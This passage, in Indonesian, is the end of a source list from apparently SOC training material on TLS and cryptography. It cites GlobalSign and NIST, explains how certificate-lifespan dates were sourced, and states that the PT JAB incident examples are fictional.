| S26 | GlobalSign: 47-Day TLS Certificate Lifespan, What It Means for Security Teams | https://www.globalsign.com/en/blog/47-day-tls-certificate-lifespan-what-it-means-for-security-teams | sekunder (blog CA) | diakses 2026-10-21 | Sedang. Tanggal 15 Maret 2026 (200 hari) dan 15 Maret 2029 (47 hari) |
| S27 | NIST: NIST Releases First 3 Finalized Post-Quantum Encryption Standards | https://www.nist.gov/news-events/news/2024/08/nist-releases-first-3-finalized-post-quantum-encryption-standards | primer (pengumuman NIST) | 2024-08-13; diakses 2026-10-21 | Tinggi. FIPS 203 ML-KEM, FIPS 204 ML-DSA, FIPS 205 SLH-DSA |

**Catatan sumber:** tanggal per tahap Ballot SC-081v3 (15 Maret 2026, 2027, dan 2029) diambil dari dua sumber sekunder [S25][S26] karena halaman ringkasan CA/Browser Forum [S24] hanya menyebut rentang Maret 2026 sampai Maret 2029; GlobalSign tidak menyebut tahap 2027, sedangkan AppViewX menyebutnya. Tanggal tahap pemakaian ulang validasi domain berbeda antar sumber sekunder, sehingga hanya angka akhirnya (10 hari) yang ditulis. Tiga sifat hash function (preimage, second preimage, collision resistance) dari glosarium NIST [S5] dan FIPS 180-4 [S6]; pengaturan bahwa MD5 masih wajar untuk sekadar mengenali file di layanan reputasi adalah praktik SOC, bukan rekomendasi standar. Daftar pemeriksaan browser terhadap sertifikat di bagian 1.6 diringkas dari path validation RFC 5280 [S17] ditambah pencocokan nama; perilaku persis halaman peringatan browser bergantung pada produk dan versinya. Contoh hash, Base64, dan PBKDF2 dihitung dari teks contoh yang disebut di setiap subbagian, bukan dari file sungguhan. Seluruh isi PT JAB (alert `SOC-2027-0830` sampai `SOC-2027-0832`, insiden `INC-2027-084`, laptop `JKT-WS-1052`, alamat `192.0.2.121`, isi sertifikat, nama CA, dan email tim aplikasi) adalah contoh fiktif.
